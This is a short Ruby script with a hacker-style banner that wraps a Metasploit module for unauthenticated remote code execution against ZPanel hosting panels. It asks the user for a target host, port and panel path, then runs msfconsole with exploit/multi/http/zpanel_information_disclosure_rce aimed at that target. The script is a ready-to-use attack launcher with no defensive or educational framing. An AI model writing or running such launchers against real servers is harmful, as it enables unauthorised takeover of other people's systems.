require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
       Zpanel Remote Unauthenticated RCE  
            Generic (PHP Payload)
	         Automatic::Multi
         
""".red
puts """
	 1st Try {set RPORT 80}
  Default is TARGETURI  /zpanel""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is The base path to Zpanel? ".blue
print " [!] ---> ".yellow
panel = gets.chomp






exec("msfconsole -x 'use exploit/multi/http/zpanel_information_disclosure_rce' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg TARGETURI #{panel}' -x 'run'")

